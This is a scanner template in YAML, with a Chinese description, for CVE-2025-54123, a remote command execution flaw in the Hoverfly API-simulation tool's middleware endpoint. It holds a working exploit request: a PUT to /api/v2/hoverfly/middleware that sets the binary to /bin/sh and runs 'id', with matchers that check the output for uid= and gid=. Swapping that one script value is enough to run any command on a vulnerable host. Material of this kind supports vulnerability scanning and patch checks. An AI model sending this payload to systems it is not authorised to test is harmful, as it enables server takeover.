content:
id: CVE-2025-54123

info:
  name: Hoverfly middleware远程命令执行
  author: Deans
  severity: high
  description: CVE-2025-54123 是一个严重的远程代码执行（RCE）漏洞，影响开源 API 模拟工具 Hoverfly 的中间件功能。该漏洞存在于 /api/v2/hoverfly/middleware 接口，源于对用户输入缺乏充分验证和清理。攻击者可以利用此漏洞执行任意系统命令，可能导致主机服务器被完全控制。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 7d62fdf72f2811a1ae7e8aa939738797

http:
- raw:
  - |-
    @timeout: 30s
    PUT /api/v2/hoverfly/middleware HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json
    Content-Length: 46

    {
      "binary": "/bin/sh",
      "script": "id"
    }

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 422
    condition: and

  - type: word
    words:
    - uid=
    - gid=
    condition: and
